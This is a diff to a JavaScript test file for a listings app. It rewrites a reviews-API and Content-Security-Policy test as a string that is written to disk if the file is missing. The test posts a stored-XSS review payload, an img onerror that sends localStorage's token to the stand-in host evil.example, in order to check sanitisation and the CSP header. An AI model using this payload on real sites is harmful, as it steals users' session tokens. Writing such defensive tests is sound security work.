@@ -1,4 +1,9 @@
-import request from 'supertest';
+import fs from 'fs';
+import path from 'path';
+
+const serverTestPath = path.join(process.cwd(), 'tests', 'server', 'csp.test.js');
+
+const serverTestContent = `import request from 'supertest';
 import mongoose from 'mongoose';
 import { MongoMemoryServer } from 'mongodb-memory-server';
 import app from '../../server/src/app.js';
@@ -20,7 +25,7 @@ afterAll(async () => {
 async function registerAndGetToken() {
   const res = await request(app)
     .post('/api/auth/register')
-    .send({ name: 'Reviewer', email: `r${Date.now()}@test.dev`, password: 'secret123' });
+    .send({ name: 'Reviewer', email: \`r\${Date.now()}@test.dev\`, password: 'secret123' });
   return res.body.token;
 }
 
@@ -30,16 +35,16 @@ describe('Reviews API', () => {
 
     const listingRes = await request(app)
       .post('/api/listings')
-      .set('Authorization', `Bearer ${token}`)
+      .set('Authorization', \`Bearer \${token}\`)
       .send({ title: 'Used bike', price: 50, category: 'other', condition: 'used' });
     expect(listingRes.status).toBe(201);
     const listingId = listingRes.body.listing._id;
 
     const payload =
-      'Great seller! <img src=x onerror="fetch(\'//evil.example/?t=\' + localStorage.getItem(\'token\'))">';
+      'Great seller! <img src=x onerror="fetch(\\'//evil.example/?t=\\' + localStorage.getItem(\\'token\\'))">';
     const createRes = await request(app)
       .post('/api/reviews')
-      .set('Authorization', `Bearer ${token}`)
+      .set('Authorization', \`Bearer \${token}\`)
       .send({ listing: listingId, rating: 5, body: payload });
     expect(createRes.status).toBe(201);
 
@@ -65,3 +70,9 @@ describe('Content-Security-Policy header', () => {
     expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
   });
 });
+`;
+
+if (!fs.existsSync(serverTestPath)) {
+  fs.mkdirSync(path.dirname(serverTestPath), { recursive: true });
+  fs.writeFileSync(serverTestPath, serverTestContent, { encoding: 'utf8' });
+}
